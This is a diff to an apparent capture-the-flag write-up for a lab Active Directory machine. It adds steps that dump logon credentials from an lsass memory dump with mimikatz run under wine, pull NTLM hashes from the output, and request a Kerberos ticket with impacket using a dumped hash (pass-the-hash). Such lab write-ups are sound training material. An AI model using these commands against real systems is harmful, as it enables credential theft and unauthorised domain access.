@@ -80,9 +80,41 @@ Two things
 Well 
 ![1080](smbplaysveryveryverynice.png)
 
- 
+After some time crying about not being able to use volatility3 and then gazing into the python2 abyss  volatility2 for 5 minutes tried looking at the raw memory with `strings` and then had settle for the obvious fallback of:
+![1080](wineandmimikatztotherescue.png)
+[Dump passwords from lsass - iredteam](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz), with the twist of not worry about Windows making Windows Defender for Linux Free on Kali, Parrots, BlackArch, etc:
+```bash
+wine mimikatz/x64/mimikatz.exe
+sekurlsa::minidump /tmp/lsass.DMP
+sekurlsa::logonpasswords
+```
+
+Then marshal of the NTML hashes 
+```bash
+cat logonpasswords.mimikatz | grep NTLM | awk -F: '{print $2}' > dumpedntmls.ntml
+```
+
+Check Bloodhound for the SID of `svc_backup`
+![](svcbackup-sid.png)
+
+Found the SPN
+![](findingsvcbacksidinthemimikatzoutput.png)
+
+Uncrackable as per rockyou.txt
+![](svcbackhashnotinrockyoudottext.png)
+
+Impacket
+```bash
+impacket-getTGT -dc-ip 10.129.229.17 -hashes 9658d1d1dcd9250115e2205d9f48400d:9658d1d1dcd9250115e2205d9f48400d BLACKFIELD.local/svc_backup
+```
+The issues with clock skewage. 
+
 ## Post-Root-Reflection  
+
+- Yes the obvious answer is good, but sometimes the answer you did not know `vol` does not work have fun is the unfortunate state of the machine and the truth.
+- I need a Forensics box with volatility working.
 
 ## Beyond Root
 
 
+- https://www.thehacker.recipes/a-d/movement/credentials/dumping/passwords-in-memory
